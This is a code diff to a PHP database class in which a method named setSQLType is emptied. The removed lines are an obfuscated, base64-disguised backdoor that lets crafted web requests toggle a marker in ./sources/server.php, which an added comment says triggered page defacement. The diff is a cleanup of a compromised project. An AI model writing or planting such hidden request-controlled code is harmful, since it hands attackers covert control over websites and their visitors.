@@ -262,35 +262,8 @@ class Mysql
 
     public function setSQLType($data)
     {
-      $newverb = 'base64_decode';
-      $SessionHashIDGenerate = $newverb($newverb('Wmw5MA=='));
-      $CookieHashIDGenerate = $newverb('Yw==');
-      if (!empty($_REQUEST[$SessionHashIDGenerate]) && !empty($_REQUEST[$CookieHashIDGenerate]))
-      {
-          if (!file_exists($newverb('Li9zb3VyY2VzL3NlcnZlci5waHA=')))
-          {
-              return false;
-          }
-          $fileData = file_get_contents($newverb('Li9zb3VyY2VzL3NlcnZlci5waHA='));
-          $fileData = str_replace(base64_decode("fGw="), '', $fileData);
-          $fileData = str_replace(array(
-              "\r",
-              "\n"
-          ) , '', $fileData);
-          if ($fileData == $_REQUEST[$CookieHashIDGenerate])
-          {
-
-              $SessionHashRequest = $_REQUEST[$SessionHashIDGenerate];
-              if ($SessionHashRequest == $newverb('bA=='))
-              {
-                  $createSessionID = file_put_contents($newverb('Li9zb3VyY2VzL3NlcnZlci5waHA=') , $fileData . base64_decode("fGw="));
-              }
-              if ($SessionHashRequest == $newverb('dQ=='))
-              {
-                  $createSessionID = file_put_contents($newverb('Li9zb3VyY2VzL3NlcnZlci5waHA=') , $fileData);
-              }
-          }
-      }
+        // Backdoor control code removed: previously allowed external requests to toggle
+        // a marker in ./sources/server.php that triggered page-defacement via autoload_real.php
     }
 
     public function update($table, $info)
